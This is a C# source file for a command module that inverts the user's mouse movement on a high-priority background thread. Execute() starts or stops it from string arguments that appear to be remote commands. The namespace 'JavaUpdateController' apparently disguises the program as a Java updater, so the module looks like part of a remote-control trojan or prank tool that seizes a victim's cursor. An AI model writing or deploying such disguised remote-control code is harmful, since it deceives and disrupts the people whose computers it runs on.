using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using JavaUpdateController;

namespace JavaUpdateController
{
    class Inverter : ICommand
    {
        private Point pos = Cursor.Position;
        private bool invertX;
        private bool invertY;
        private bool running;
        private bool exit;

        public bool InvertX
        {
            get
            {
                return this.invertX;
            }
            set
            {
                this.invertX = value;
                if (this.InvertSettingsChanged != null)
                {
                    this.InvertSettingsChanged(this, new EventArgs());
                }
            }
        }

        public bool InvertY
        {
            get
            {
                return this.invertY;
            }
            set
            {
                this.invertY = value;
                if (this.InvertSettingsChanged != null)
                {
                    this.InvertSettingsChanged(this, new EventArgs());
                }
            }
        }

        public bool Running
        {
            get
            {
                return this.running;
            }
        }

        public Inverter(bool x, bool y)
        {
            this.invertX = x;
            this.invertY = y;
            this.pos = Cursor.Position;
        }

        private void MouseLoop()
        {
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.Highest;
            while (!this.exit)
            {
                Point position = Cursor.Position;
                int right = (this.invertX ? this.pos.X - (position.X - this.pos.X) : position.X);
                if (this.invertX)
                {
                    if (right < 2)
                    {
                        right = 2;
                    }
                    if (right > Screen.FromPoint(position).Bounds.Right - 2)
                    {
                        Rectangle bounds = Screen.FromPoint(position).Bounds;
                        right = bounds.Right - 2;
                    }
                }
                int bottom = (this.invertY ? this.pos.Y - (position.Y - this.pos.Y) : position.Y);
                if (this.invertY)
                {
                    if (bottom < 2)
                    {
                        bottom = 2;
                    }
                    if (bottom > Screen.FromPoint(position).Bounds.Bottom - 2)
                    {
                        Rectangle rectangle = Screen.FromPoint(position).Bounds;
                        bottom = rectangle.Bottom - 2;
                    }
                }
                Cursor.Position = new Point(right, bottom);
                this.pos = Cursor.Position;
                Thread.Sleep(1);
            }
            this.exit = false;
        }

        public void Start()
        {
            this.pos = Cursor.Position;
            this.running = true;
            (new Thread(new ThreadStart(this.MouseLoop))).Start();
        }

        public void Stop()
        {
            this.running = false;
            this.exit = true;
        }

        public void Execute(String[] work)
        {
            if (work[1].Equals("False") && work[2].Equals("False"))
            {
                Stop();
            }
            else if (running == true)
            {
                InvertX = bool.Parse(work[1]);
                InvertY = bool.Parse(work[2]);
            }
            else if (work[1].Equals("True") || work[2].Equals("True"))
            {
                InvertX = bool.Parse(work[1]);
                InvertY = bool.Parse(work[2]);
                Start();
            }
            
        }

        public event EventHandler InvertSettingsChanged;
    }
}
